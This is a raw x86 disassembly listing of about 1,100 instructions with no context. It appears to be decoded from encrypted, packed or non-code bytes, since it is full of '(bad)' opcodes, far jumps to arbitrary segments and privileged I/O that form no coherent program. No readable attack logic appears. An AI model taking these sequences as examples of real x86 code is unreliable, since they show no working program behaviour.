  420c20:	and    DWORD PTR [edx-0x1613f1da],ebx
  420c26:	add    bl,bl
  420c28:	in     eax,0xae
  420c2a:	mov    ah,0x34
  420c2c:	mov    ds:0x34d571ce,al
  420c31:	das    
  420c32:	dec    ebp
  420c33:	dec    edi
  420c34:	test   al,0x24
  420c36:	stos   BYTE PTR es:[edi],al
  420c37:	mov    cl,0xaf
  420c39:	lods   eax,DWORD PTR ds:[esi]
  420c3a:	outs   dx,DWORD PTR ds:[esi]
  420c3b:	sbb    DWORD PTR [edi+0x6d],esi
  420c3e:	icebp  
  420c3f:	adc    al,0x8b
  420c41:	scas   eax,DWORD PTR es:[edi]
  420c42:	cmp    dl,cl
  420c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c45:	inc    esi
  420c46:	sub    DWORD PTR [edi+0x58367e6f],ecx
  420c4c:	xchg   edx,eax
  420c4d:	jecxz  0x420ca9
  420c4f:	mov    ah,0x6f
  420c51:	inc    esi
  420c52:	ins    DWORD PTR es:[edi],dx
  420c53:	loop   0x420c30
  420c55:	inc    ecx
  420c56:	in     al,dx
  420c57:	inc    ebx
  420c58:	das    
  420c59:	popa   
  420c5a:	ja     0x420c3e
  420c5c:	jl     0x420c94
  420c5e:	mov    ah,0xf1
  420c60:	(bad)  
  420c61:	push   ds
  420c62:	jmp    0xcece:0xd5706404
  420c69:	xor    ebp,edx
  420c6b:	push   edx
  420c6c:	push   0xd129f77d
  420c71:	(bad)  
  420c72:	cli    
  420c73:	rol    DWORD PTR [edi],cl
  420c75:	in     al,0x9a
  420c77:	xor    eax,0x9c8d0d81
  420c7c:	movntq (bad),mm5
  420c7d:	out    0xef,eax
  420c7f:	mov    gs,WORD PTR [ecx]
  420c81:	in     al,dx
  420c82:	adc    eax,0xe51d1c7e
  420c87:	adc    eax,0xcbfe1a54
  420c8c:	or     dh,BYTE PTR [ebp+0x5f]
  420c8f:	ror    DWORD PTR [esi-0x30ce7e0b],1
  420c95:	mov    ch,0x6d
  420c97:	mov    ch,0x1d
  420c99:	cdq    
  420c9a:	shl    BYTE PTR [esi+0x5fc2dc5d],0xb7
  420ca1:	add    eax,0xc125220c
  420ca6:	fidiv  DWORD PTR ds:[esi-0x26]
  420caa:	jp     0x420ced
  420cac:	jp     0x420c3a
  420cae:	jle    0x420c97
  420cb0:	xor    al,0xaa
  420cb2:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  420cb4:	les    edi,FWORD PTR cs:[esp+ebp*1-0x7e]
  420cb9:	shl    DWORD PTR [ecx-0x57626661],0xb7
  420cc0:	scas   al,BYTE PTR es:[edi]
  420cc1:	aaa    
  420cc2:	push   edx
  420cc3:	jnp    0x420c8c
  420cc5:	out    0xfb,eax
  420cc7:	jecxz  0x420cf5
  420cc9:	jb     0x420ccc
  420ccb:	lock test al,0x81
  420cce:	jno    0x420c76
  420cd0:	fdiv   DWORD PTR ds:0x2f0c541c
  420cd6:	(bad)
  420cd9:	and    DWORD PTR [eax-0x5ad2517e],ecx
  420cdf:	inc    edx
  420ce0:	fadd   QWORD PTR [edx]
  420ce2:	or     edi,DWORD PTR [esi+0x4d]
  420ce5:	call   0x6653:0x3cd1477c
  420cec:	mov    al,0x3d
  420cee:	jne    0x420c9b
  420cf0:	push   ss
  420cf1:	fs jge 0x420d1b
  420cf4:	pop    ds
  420cf5:	dec    edx
  420cf6:	(bad)  
  420cf7:	dec    eax
  420cf8:	xchg   BYTE PTR [ecx-0x4788df86],ah
  420cfe:	mov    al,0xc1
  420d00:	xor    BYTE PTR [edx],ah
  420d02:	mov    esp,0x1ec71d53
  420d07:	rcl    BYTE PTR [ebp-0x7c944146],cl
  420d0d:	sub    eax,0x9c069a51
  420d12:	stos   DWORD PTR es:[edi],eax
  420d13:	iret   
  420d14:	mov    ebx,0xb292f2c
  420d19:	repnz inc ebp
  420d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d1d:	(bad)  
  420d1e:	or     BYTE PTR [ecx],al
  420d20:	push   ebp
  420d21:	xchg   esi,eax
  420d22:	scas   al,BYTE PTR es:[edi]
  420d23:	adc    al,0x6
  420d26:	dec    eax
  420d27:	sbb    DWORD PTR [eax],0xa
  420d2a:	adc    bl,BYTE PTR [edx+eiz*2+0x3b2571b0]
  420d31:	jbe    0x420ce7
  420d33:	xchg   edx,eax
  420d34:	mov    gs,WORD PTR [eax-0x25f8f645]
  420d3a:	nop
  420d3b:	mov    ecx,0x3cc6e8d4
  420d40:	xor    bl,BYTE PTR [ebp-0x51]
  420d43:	test   BYTE PTR [esi+0x5a71457d],al
  420d49:	das    
  420d4a:	jmp    0xf4d3:0xf9079c06
  420d51:	sub    BYTE PTR [edx-0x41],ch
  420d54:	xor    dh,BYTE PTR ss:0xb1312960
  420d5b:	sbb    bh,bh
  420d5d:	adc    eax,0xf7846e74
  420d62:	add    DWORD PTR ss:[edi-0x77],0x14
  420d67:	jmp    0x420d77
  420d69:	ins    BYTE PTR es:[edi],dx
  420d6a:	dec    ebp
  420d6b:	adc    dh,dh
  420d6d:	pop    ds
  420d6e:	cld    
  420d6f:	xchg   edx,eax
  420d70:	lds    ebp,FWORD PTR [eax-0x6d0086bf]
  420d76:	fdivr  st,st(2)
  420d78:	scas   eax,DWORD PTR es:[edi]
  420d79:	ror    DWORD PTR [eax],1
  420d7b:	jnp    0x420d5d
  420d7d:	into   
  420d7e:	push   edx
  420d7f:	xchg   ecx,eax
  420d80:	(bad)  
  420d81:	cmp    edx,DWORD PTR [ebx]
  420d83:	fs hlt 
  420d85:	out    0x4,al
  420d87:	(bad)  
  420d88:	(bad)  
  420d89:	cmp    eax,0x45062a99
  420d8e:	xor    ah,dl
  420d90:	lods   eax,DWORD PTR ds:[esi]
  420d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d92:	icebp  
  420d93:	fistp  QWORD PTR [ebp+0x2b18e19a]
  420d99:	cmp    al,0xd1
  420d9b:	ds inc ebp
  420d9d:	fiadd  WORD PTR [esi+0x25]
  420da0:	push   esp
  420da1:	js     0x420d5b
  420da3:	ins    DWORD PTR es:[edi],dx
  420da4:	inc    edx
  420da5:	pop    ecx
  420da6:	jle    0x420d9a
  420da8:	popa   
  420da9:	jno    0x420dfe
  420dab:	div    al
  420dad:	mul    bh
  420daf:	or     eax,0x949db836
  420db4:	pop    edx
  420db5:	mov    dl,0xc6
  420db7:	sbb    ebp,DWORD PTR [esp+eiz*8+0x679e7dbd]
  420dbe:	dec    eax
  420dbf:	ins    DWORD PTR es:[edi],dx
  420dc0:	jnp    0x420dcf
  420dc2:	loop   0x420d84
  420dc4:	sbb    ebx,DWORD PTR [edx+eiz*8-0xb]
  420dc8:	ret    
  420dc9:	lds    eax,FWORD PTR [ecx-0x11]
  420dcc:	sub    al,0xc7
  420dce:	(bad)  
  420dcf:	call   0x6e9824f0
  420dd4:	inc    eax
  420dd5:	sbb    BYTE PTR ds:0x7db4a8be,ah
  420ddb:	sub    DWORD PTR [edi],esp
  420ddd:	imul   esi,DWORD PTR [eax-0x2],0x6c
  420de1:	mov    dh,0x9f
  420de3:	xor    BYTE PTR [ebx],dl
  420de5:	push   edi
  420de6:	cmp    al,0xf2
  420de8:	mov    dh,BYTE PTR [eax-0xc]
  420deb:	nop
  420dec:	mov    cl,0x25
  420dee:	cs cmp al,0x1b
  420df1:	out    dx,eax
  420df2:	fsub   st(7),st
  420df4:	sub    eax,0x3642b9bf
  420df9:	dec    esi
  420dfa:	out    0x4a,al
  420dfc:	adc    al,0x85
  420dfe:	stc    
  420dff:	repz sbb DWORD PTR [esp+esi*4-0x2e2e3ab7],0xa
  420e08:	aam    0xc1
  420e0a:	push   edx
  420e0b:	test   DWORD PTR ss:[ebp+0x2b],ecx
  420e0f:	leave  
  420e10:	es mov esi,0x8fa1ad0
  420e16:	push   eax
  420e17:	mov    ecx,esp
  420e19:	addr16 push edx
  420e1b:	out    dx,eax
  420e1c:	xchg   DWORD PTR [edx+0x15cdc585],esi
  420e22:	pop    edx
  420e23:	rol    cl,0x43
  420e26:	jns    0x420e0b
  420e28:	sub    eax,0xb6d381a9
  420e2d:	or     eax,0x58b1f682
  420e32:	dec    esi
  420e33:	aaa    
  420e34:	in     eax,dx
  420e35:	stos   BYTE PTR es:[edi],al
  420e36:	ret    
  420e37:	js     0x420dbb
  420e39:	nop
  420e3a:	mov    edi,0x7a04899c
  420e3f:	clc    
  420e40:	sub    eax,0x1296e9f9
  420e45:	aam    0x61
  420e47:	pushf  
  420e48:	mov    dh,0x4
  420e4a:	icebp  
  420e4b:	push   edx
  420e4c:	xchg   edx,eax
  420e4d:	ret    
  420e4e:	stos   BYTE PTR es:[edi],al
  420e4f:	int3   
  420e50:	push   cs
  420e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e53:	inc    ecx
  420e54:	jle    0x420e42
  420e56:	jp     0x420ddc
  420e58:	pop    es
  420e59:	sub    eax,DWORD PTR [ecx-0xfe08dc4]
  420e5f:	xor    WORD PTR [edx],cx
  420e62:	in     eax,dx
  420e63:	mov    ebx,0xcac28c78
  420e68:	jns    0x420df9
  420e6a:	push   0x20
  420e6c:	add    BYTE PTR [edx],ch
  420e6e:	aad    0x14
  420e70:	retf   0x7b28
  420e73:	(bad)  
  420e74:	sub    eax,0xaf231cbf
  420e79:	xchg   ebx,eax
  420e7a:	lods   eax,DWORD PTR ds:[esi]
  420e7b:	in     eax,dx
  420e7c:	cmp    cl,BYTE PTR [ebx-0x2c]
  420e7f:	inc    ecx
  420e80:	inc    ecx
  420e81:	jecxz  0x420efc
  420e83:	sub    ch,0xc9
  420e86:	or     BYTE PTR [edi+0x75],dl
  420e89:	sub    DWORD PTR [edx+0x32],edi
  420e8c:	idiv   BYTE PTR [edi-0x73]
  420e8f:	jne    0x420e2e
  420e91:	jl     0x420f0d
  420e93:	cmp    al,0x34
  420e95:	loope  0x420f16
  420e97:	gs mov ?,eax
  420e9a:	scas   al,BYTE PTR es:[edi]
  420e9b:	stc    
  420e9c:	inc    eax
  420e9d:	in     al,0x44
  420e9f:	in     al,0x7c
  420ea1:	stos   BYTE PTR es:[edi],al
  420ea2:	and    al,bh
  420ea4:	shl    DWORD PTR [esi-0x79],0x5d
  420ea8:	inc    eax
  420ea9:	mov    cl,0xe6
  420eab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eac:	popa   
  420ead:	adc    al,0x2e
  420eaf:	xor    al,0x8
  420eb1:	or     ecx,DWORD PTR [edx+edx*4+0x342052c0]
  420eb8:	xor    bl,BYTE PTR [edi+0x53ced16e]
  420ebe:	adc    dh,BYTE PTR ds:0xfcaba03e
  420ec4:	(bad)  
  420ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ec6:	test   al,0x98
  420ec8:	(bad)
  420ecb:	ds xchg ebx,eax
  420ecd:	adc    esp,0x17f59594
  420ed3:	jge    0x420f1f
  420ed5:	mov    edx,0xf62b5f03
  420eda:	pop    es
  420edb:	mov    ecx,0x5abc1908
  420ee0:	mov    edx,0x55e193c0
  420ee5:	(bad)  
  420ee7:	iret   
  420ee8:	out    0xaa,eax
  420eea:	or     bl,BYTE PTR [edx]
  420eec:	(bad)  
  420eed:	push   edi
  420eee:	sub    ch,bl
  420ef0:	inc    eax
  420ef1:	stc    
  420ef2:	fidivr WORD PTR [edx-0x6c]
  420ef5:	lods   al,BYTE PTR ds:[esi]
  420ef6:	mov    ecx,0x28866117
  420efb:	retf   
  420efc:	xchg   edx,eax
  420efd:	or     al,0x62
  420eff:	(bad)  [ecx]
  420f01:	and    ah,BYTE PTR [ecx]
  420f03:	cmc    
  420f04:	adc    BYTE PTR [ebx+edi*8+0x43],0x5b
  420f09:	jbe    0x420ef9
  420f0b:	mov    al,ds:0x4aec33ed
  420f10:	sahf   
  420f11:	les    edx,FWORD PTR [ecx]
  420f13:	leave  
  420f14:	ret    
  420f15:	mov    BYTE PTR [ecx],ah
  420f17:	in     al,dx
  420f18:	(bad)  
  420f19:	fmulp  st(3),st
  420f1b:	add    DWORD PTR [ebx],0x51
  420f1e:	cwde   
  420f1f:	ss aas 
  420f21:	fcmovbe st,st(0)
  420f23:	pop    ss
  420f24:	popa   
  420f25:	mov    esi,0x738b6334
  420f2a:	or     ch,BYTE PTR [ebx-0x1321e948]
  420f30:	push   esp
  420f31:	jge    0x420f3b
  420f33:	cmp    cl,0x88
  420f36:	push   esi
  420f37:	sub    DWORD PTR [edx-0x159d151e],esi
  420f3d:	pop    ds
  420f3e:	cli    
  420f3f:	mov    al,ds:0xb53ab80b
  420f44:	lahf   
  420f45:	pop    esi
  420f46:	push   0x14
  420f48:	fld    DWORD PTR [edi-0xa5ceae3]
  420f4e:	inc    esi
  420f4f:	pushf  
  420f50:	cmp    ebp,DWORD PTR [eax+0x627c02e3]
  420f56:	sub    eax,0x68a9d95e
  420f5b:	sar    BYTE PTR [esi+0x56aad366],cl
  420f61:	popa   
  420f62:	sbb    ecx,DWORD PTR [eax+0x76]
  420f65:	pushf  
  420f66:	dec    ecx
  420f67:	mov    esp,0xe951a068
  420f6c:	cmp    edx,DWORD PTR [ebp-0x1733bd97]
  420f72:	adc    al,0xc2
  420f74:	push   ebp
  420f75:	xchg   ebp,eax
  420f76:	sub    bh,BYTE PTR [edx+ebp*1+0x74]
  420f7a:	pushf  
  420f7b:	bound  ebp,QWORD PTR [ebx-0x2e]
  420f7e:	(bad)  
  420f7f:	fucomp st(3)
  420f81:	sbb    bl,bh
  420f83:	in     eax,dx
  420f84:	leave  
  420f85:	data16 sbb dl,0xd5
  420f89:	mov    ebx,0xbb455214
  420f8e:	loopne 0x421000
  420f90:	sub    DWORD PTR [esi],edx
  420f92:	mov    dl,0xa
  420f94:	mov    cs,WORD PTR fs:0x70287e6
  420f9b:	sbb    eax,DWORD PTR [ebx+0x24]
  420f9e:	dec    ebx
  420f9f:	sbb    al,0x23
  420fa1:	fs mov dl,0x34
  420fa4:	xor    al,0x27
  420fa6:	sbb    cl,BYTE PTR ds:0xa051b16c
  420fac:	dec    ebp
  420fad:	loop   0x421016
  420faf:	jecxz  0x420fd8
  420fb1:	and    edi,DWORD PTR [ebx]
  420fb3:	pop    ebp
  420fb4:	pop    ebx
  420fb5:	mov    BYTE PTR [esi],ch
  420fb7:	lea    esp,[edi-0x12cfeb6d]
  420fbd:	ss jle 0x420fe5
  420fc0:	sbb    al,0x66
  420fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fc3:	jb     0x421024
  420fc5:	or     al,0xc2
  420fc7:	stc    
  420fc8:	ror    cl,0x4b
  420fcb:	mov    bl,0x7
  420fcd:	das    
  420fce:	in     eax,0x90
  420fd0:	inc    ecx
  420fd1:	or     esp,DWORD PTR [edi]
  420fd3:	inc    edi
  420fd4:	dec    eax
  420fd5:	icebp  
  420fd6:	xchg   esp,eax
  420fd7:	sbb    al,0xa4
  420fd9:	icebp  
  420fda:	dec    ecx
  420fdb:	jecxz  0x420fc6
  420fdd:	adc    DWORD PTR [ecx+0x16],ebx
  420fe0:	and    dh,BYTE PTR [ecx+edx*1+0x2400293]
  420fe7:	sub    DWORD PTR [ecx+eax*1-0x2e],esi
  420feb:	aas    
  420fec:	cmp    al,0x57
  420fee:	call   0x1928:0xfe4bf55f
  420ff5:	sub    ebp,ecx
  420ff7:	loopne 0x42101d
  420ff9:	sub    bl,BYTE PTR [ebp-0x3f]
  420ffc:	iret   
  420ffd:	jnp    0x421023
  420fff:	call   ebp
  421001:	in     al,0x12
  421003:	(bad)  
  421004:	in     eax,dx
  421005:	xchg   ebp,eax
  421006:	cmp    BYTE PTR [edi-0x44],bl
  421009:	mov    al,0xca
  42100b:	sbb    bl,BYTE PTR [eax-0x43]
  42100e:	pop    es
  42100f:	scas   al,BYTE PTR es:[edi]
  421010:	mov    esi,0x977ddebc
  421015:	out    dx,eax
  421016:	push   es
  421017:	lods   eax,DWORD PTR ds:[esi]
  421018:	outs   dx,BYTE PTR ds:[esi]
  421019:	push   cs
  42101a:	pop    edi
  42101b:	adc    al,0x1d
  42101d:	mov    bl,0xa7
  42101f:	push   DWORD PTR [eax-0xc9d8173]
  421025:	push   DWORD PTR [ebx]
  421027:	js     0x42100c
  421029:	xor    edi,DWORD PTR [ecx-0x314787c3]
  42102f:	jmp    0x9f4fa676
  421034:	cmp    DWORD PTR [ebx+0x51],0x9c61e838
  42103b:	mov    bl,BYTE PTR [ecx]
  42103d:	enter  0x4d82,0x14
  421041:	pusha  
  421042:	sahf   
  421043:	rcr    ebx,cl
  421045:	jne    0x421033
  421047:	je     0x421047
  421049:	sbb    al,0x10
  42104b:	aam    0xa0
  42104d:	adc    ebx,DWORD PTR ds:[ebx-0x1bb7e309]
  421054:	in     eax,dx
  421055:	and    DWORD PTR [ebp-0x1a],eax
  421058:	dec    ebx
  421059:	dec    esp
  42105a:	lea    ebx,[edx+ecx*2+0x6c]
  42105e:	fs je  0x421010
  421061:	jno    0x421086
  421063:	nop
  421064:	push   es
  421065:	fsub   DWORD PTR [esi]
  421067:	xchg   ebx,eax
  421068:	or     DWORD PTR [edx],edx
  42106a:	inc    eax
  42106b:	pop    edi
  42106c:	mov    ch,0x1
  42106e:	adc    BYTE PTR [eax],dl
  421070:	loop   0x421049
  421072:	xchg   ebx,eax
  421073:	xchg   esi,eax
  421074:	js     0x42101b
  421076:	or     ah,BYTE PTR [edi-0x4b7b541a]
  42107c:	lea    ecx,[esi]
  42107e:	mov    esp,0x30e27419
  421083:	pop    ebx
  421084:	sub    cl,BYTE PTR [ecx*2+0x5a25c5fc]
  42108b:	repz pusha 
  42108d:	adc    eax,0x9328c8f4
  421092:	pop    esp
  421093:	push   es
  421094:	inc    edx
  421095:	mov    ah,0xa2
  421098:	ret    0xc9ee
  42109b:	xor    eax,0xd1247bbc
  4210a0:	jo     0x4210f2
  4210a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210a3:	dec    ebp
  4210a4:	xchg   DWORD PTR [esi+0x39338c3d],eax
  4210aa:	cmp    BYTE PTR [esi],0x31
  4210ad:	xlat   BYTE PTR ds:[ebx]
  4210ae:	sar    DWORD PTR [esi],1
  4210b0:	or     BYTE PTR [ecx+0x7d],0x7
  4210b4:	xchg   esp,eax
  4210b5:	ja     0x421091
  4210b7:	ror    BYTE PTR [ecx+0x57],cl
  4210ba:	push   es
  4210bb:	inc    BYTE PTR [esp+edi*1+0x50642031]
  4210c2:	jbe    0x4210d2
  4210c4:	mov    ch,0xe5
  4210c6:	fisttp WORD PTR [esi]
  4210c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210c9:	ficomp DWORD PTR [edi-0x5f93ab1e]
  4210cf:	rcl    BYTE PTR [esi+0x7f139b16],cl
  4210d5:	mov    ds:0xa252d18f,eax
  4210da:	jmp    0x85f62df1
  4210df:	or     bh,cl
  4210e1:	push   edi
  4210e2:	sbb    al,0x74
  4210e4:	dec    ecx
  4210e5:	adc    dl,0x3f
  4210e8:	call   0xc6a620a7
  4210ed:	or     ecx,DWORD PTR [esi]
  4210ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210f0:	jmp    0x7a80:0x626b8469
  4210f7:	xor    al,0xbb
  4210f9:	cmc    
  4210fa:	and    DWORD PTR [edx-0x4a],ebx
  4210fd:	cmp    al,0xe0
  4210ff:	add    ah,BYTE PTR ds:0x130bad5e
  421105:	sbb    ecx,DWORD PTR [ebx+0x2ba27b23]
  42110b:	cmp    ecx,edx
  42110d:	pop    es
  42110e:	shl    DWORD PTR ds:0xa1f80d8d,1
  421114:	cmp    bh,bh
  421116:	mov    ebx,0x9ec1879d
  42111b:	pop    ss
  42111c:	addr16 dec ebx
  42111e:	jnp    0x42110d
  421120:	jae    0x42116a
  421122:	sbb    BYTE PTR [eax],0xcc
  421125:	cld    
  421126:	add    BYTE PTR [esi],ah
  421128:	pop    esi
  421129:	mov    al,ds:0x7a130bdf
  42112e:	add    esp,0xb45f19ff
  421134:	sub    ebx,DWORD PTR [edi-0x27]
  421137:	nop
  421138:	outs   dx,BYTE PTR ds:[esi]
  421139:	sbb    DWORD PTR [edi-0x40e0a423],edx
  42113f:	ret    0x40f1
  421142:	pop    ebx
  421143:	rol    al,cl
  421145:	and    al,0xbf
  421147:	shr    BYTE PTR [esi],0x8c
  42114a:	sahf   
  42114b:	cmp    edx,DWORD PTR ds:0xe0913dec
  421151:	dec    ebx
  421152:	rol    eax,0xfc
  421155:	mov    ah,0x71
  421157:	inc    ecx
  421158:	xchg   ebx,eax
  421159:	les    eax,FWORD PTR [esi-0x56]
  42115c:	ret    0xc3bb
  42115f:	mov    ebx,es
  421161:	xor    ch,bh
  421163:	jnp    0x4210ef
  421165:	dec    esp
  421166:	xchg   ebp,eax
  421167:	mov    eax,0x9d61f695
  42116c:	and    dh,BYTE PTR [ebx+0x57]
  42116f:	jae    0x4211d9
  421171:	jle    0x42115a
  421173:	mov    esi,0xcf6d5f25
  421178:	push   eax
  421179:	loopne 0x421109
  42117b:	xor    cl,BYTE PTR [ecx+0x69]
  42117e:	push   ebx
  42117f:	and    al,0x29
  421181:	xchg   DWORD PTR [eax+0x44eaf5c2],ecx
  421187:	cmp    esp,DWORD PTR [ebx+0x38]
  42118a:	fwait
  42118b:	test   al,0xa4
  42118d:	cmp    eax,0xfe53228c
  421192:	sar    ah,cl
  421194:	das    
  421195:	xor    dh,BYTE PTR cs:[edx-0x6e]
  421199:	mov    ah,0x50
  42119b:	nop
  42119c:	mov    dh,0x49
  42119e:	xchg   edi,eax
  42119f:	inc    ebx
  4211a0:	jl     0x421211
  4211a2:	xor    ebp,DWORD PTR [ebx+0x5c]
  4211a5:	sbb    al,0xb2
  4211a7:	inc    edx
  4211a8:	mov    ecx,0x7a5a6609
  4211ad:	repnz push eax
  4211af:	ja     0x421132
  4211b1:	push   0x3a714591
  4211b6:	fild   DWORD PTR ds:0xd45ec990
  4211bc:	fstp   st(2)
  4211be:	fwait
  4211bf:	lea    edx,[esi-0x2b]
  4211c2:	fst    DWORD PTR [ebx-0x24f92a2a]
  4211c8:	in     eax,dx
  4211c9:	popa   
  4211ca:	push   ds
  4211cb:	in     eax,dx
  4211cc:	push   esi
  4211cd:	out    dx,eax
  4211ce:	es and bh,cl
  4211d1:	call   0xbfe2:0x48d0b9b2
  4211d8:	jp     0x421206
  4211da:	popa   
  4211db:	in     al,0xa6
  4211dd:	inc    ebp
  4211de:	inc    edi
  4211df:	push   0xffffff9d
  4211e1:	rcl    bl,0x90
  4211e4:	xchg   BYTE PTR [ecx],cl
  4211e6:	dec    esi
  4211e7:	xchg   esi,eax
  4211e8:	mov    dl,0x8b
  4211ea:	bnd jmp 0x72697b90
  4211f0:	bound  ebx,QWORD PTR [edi+ebp*1+0x3102eb1f]
  4211f7:	mov    dh,0x15
  4211f9:	xchg   esi,eax
  4211fa:	call   0xcb83:0x25db3485
  421201:	inc    edx
  421202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421203:	cmp    BYTE PTR [edx],ch
  421205:	es sub eax,0xe7c04f62
  42120b:	ss mov bl,0xa1
  42120e:	out    dx,al
  42120f:	dec    ecx
  421210:	mov    BYTE PTR [ebx-0x30],cl
  421213:	aad    0x63
  421215:	popf   
  421216:	test   DWORD PTR [eax-0x36],esp
  421219:	cmp    al,0x83
  42121b:	push   ecx
  42121c:	aad    0x27
  42121e:	stos   BYTE PTR es:[edi],al
  42121f:	inc    ebx
  421220:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  421222:	lock push ecx
  421224:	pop    edx
  421225:	mov    ds:0x95207b71,al
  42122a:	xor    eax,0xc4866565
  42122f:	inc    edi
  421230:	fst    QWORD PTR [esi-0x4f]
  421233:	push   ecx
  421234:	test   DWORD PTR ds:0x3b8b4f43,ebp
  42123a:	paddd  mm4,QWORD PTR [esi+0x61]
  42123e:	mov    al,0x3c
  421240:	jp     0x42120b
  421242:	je     0x4211ed
  421244:	sub    eax,0xb295a1e3
  421249:	out    dx,eax
  42124a:	pop    ss
  42124b:	(bad)  
  42124c:	pop    ecx
  42124d:	and    dl,BYTE PTR [esi+0x50]
  421250:	or     DWORD PTR [ecx],ebx
  421252:	mov    cl,0xc3
  421254:	xchg   BYTE PTR [esi-0x44],cl
  421257:	mov    esp,0x7ca82638
  42125c:	mov    edx,gs
  42125e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42125f:	shl    ebx,1
  421261:	fcom   DWORD PTR [edi]
  421263:	loop   0x4211f2
  421265:	test   BYTE PTR [eax],bh
  421267:	cmp    BYTE PTR ds:0x8da01e8e,al
  42126d:	fwait
  42126e:	mov    eax,ds:0x5b75cfb1
  421273:	rol    ch,1
  421275:	xchg   edx,eax
  421276:	call   0x9f8a77c8
  42127b:	int    0x3c
  42127d:	popf   
  42127e:	dec    eax
  42127f:	pop    ebp
  421280:	call   0x76fa3398
  421285:	dec    edi
  421286:	mov    bl,0x3c
  421288:	add    DWORD PTR [eax],ebp
  42128a:	enter  0xe353,0x4
  42128e:	xchg   DWORD PTR [ecx-0x7c3a1d24],esp
  421294:	fld    QWORD PTR [edi-0x35b88c1d]
  42129a:	xchg   esi,edx
  42129c:	shl    eax,cl
  42129e:	push   esi
  42129f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212a0:	jecxz  0x42124c
  4212a2:	mov    ds:0x72760a57,al
  4212a7:	(bad)  
  4212a9:	cld    
  4212aa:	repz (bad) 
  4212ac:	retf   0x4b25
  4212af:	inc    eax
  4212b0:	pop    ebp
  4212b1:	push   edx
  4212b2:	mov    dh,0xee
  4212b4:	and    ch,cl
  4212b6:	retf   0xe41c
  4212b9:	sbb    DWORD PTR [eax+0x1d47c9d2],esp
  4212bf:	ins    DWORD PTR es:[edi],dx
  4212c0:	daa    
  4212c1:	jno    0x421248
  4212c3:	outs   dx,BYTE PTR ds:[esi]
  4212c4:	adc    eax,0x12c4496f
  4212c9:	xor    al,0xef
  4212cb:	cld    
  4212cc:	sbb    DWORD PTR [ecx],esp
  4212ce:	mov    al,0xbb
  4212d0:	shl    bl,1
  4212d2:	adc    esi,DWORD PTR [ebx-0x7bdabee5]
  4212d8:	in     eax,dx
  4212d9:	std    
  4212da:	in     al,dx
  4212db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212dc:	sub    ecx,DWORD PTR [eax-0x73]
  4212df:	dec    esp
  4212e0:	cdq    
  4212e1:	jmp    0x2e9f3ba7
  4212e6:	sub    al,0x40
  4212e8:	jp     0x421301
  4212ea:	pop    ecx
  4212eb:	add    BYTE PTR [ebx],dl
  4212ed:	sahf   
  4212ee:	pop    es
  4212ef:	pop    ecx
  4212f0:	adc    ebx,esp
  4212f2:	adc    eax,0xbe701145
  4212f7:	jle    0x42134f
  4212f9:	mov    gs,WORD PTR [ebx-0x14f88b0f]
  4212ff:	(bad)  [eax-0x3dd6a001]
  421305:	adc    eax,0x19c66b0
  42130a:	fdivr  QWORD PTR [ebp+0x518afba]
  421310:	or     eax,0xccb92b67
  421315:	rcr    BYTE PTR [ecx],1
  421317:	pop    esi
  421318:	dec    edx
  421319:	pop    ds
  42131a:	xor    dl,BYTE PTR [edx]
  42131c:	sub    edx,DWORD PTR [ebp-0x6e]
  42131f:	(bad)  [eax-0x1c]
  421322:	add    DWORD PTR [esi+0x20],edx
  421325:	mov    ch,0xd9
  421327:	jno    0x4212b8
  421329:	(bad)  
  42132b:	scas   eax,DWORD PTR es:[edi]
  42132c:	sub    bh,BYTE PTR ds:0xa739a6e5
  421332:	test   eax,0x9db7e118
  421337:	mov    bl,0x1c
  421339:	xchg   ecx,eax
  42133a:	inc    ecx
  42133b:	xor    al,0xa5
  42133d:	neg    BYTE PTR [ebp+0x67]
  421340:	daa    
  421341:	hlt    
  421342:	sti    
  421343:	add    BYTE PTR [eax+0x787a2fef],bh
  421349:	sbb    ch,BYTE PTR [edx]
  42134b:	cmp    BYTE PTR [esp+0x41a62ebf],cl
  421352:	push   0x4e
  421354:	pop    edi
  421355:	iret   
  421356:	fldcw  WORD PTR [ebp+0x3e79ed35]
  42135c:	lods   eax,DWORD PTR ds:[esi]
  42135d:	dec    edx
  42135e:	(bad)
  421361:	addr16 fwait
  421363:	xchg   esp,eax
  421364:	sahf   
  421365:	mov    esi,0x5200abc8
  42136a:	fsubr  QWORD PTR [ecx-0x74db93d3]
  421370:	sub    dl,BYTE PTR [ebp-0x1f9100bb]
  421376:	pop    esi
  421377:	out    0x88,al
  421379:	adc    ecx,DWORD PTR [eax]
  42137b:	dec    ebp
  42137c:	sbb    BYTE PTR ds:0xb4b713c3,0x37
  421383:	sbb    ebp,eax
  421385:	out    0x72,eax
  421387:	clc    
  421388:	inc    esi
  421389:	add    ah,0x9b
  42138c:	clc    
  42138d:	inc    eax
  42138e:	adc    cl,al
  421390:	or     bh,BYTE PTR [edi+0x657f851e]
  421396:	jecxz  0x421343
  421398:	mov    dh,0x73
  42139a:	enter  0xa33c,0x1b
  42139e:	ins    DWORD PTR es:[edi],dx
  42139f:	aas    
  4213a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213a1:	jo     0x42137b
  4213a3:	mov    al,ds:0x50557ffa
  4213a8:	fwait
  4213a9:	inc    esi
  4213aa:	call   0x36e3d051
  4213af:	scas   eax,DWORD PTR es:[edi]
  4213b0:	(bad)  
  4213b1:	cdq    
  4213b2:	xchg   BYTE PTR [edi],ch
  4213b4:	xor    ebx,DWORD PTR [edx+0x13]
  4213b7:	or     edi,eax
  4213b9:	fidivr DWORD PTR [esi]
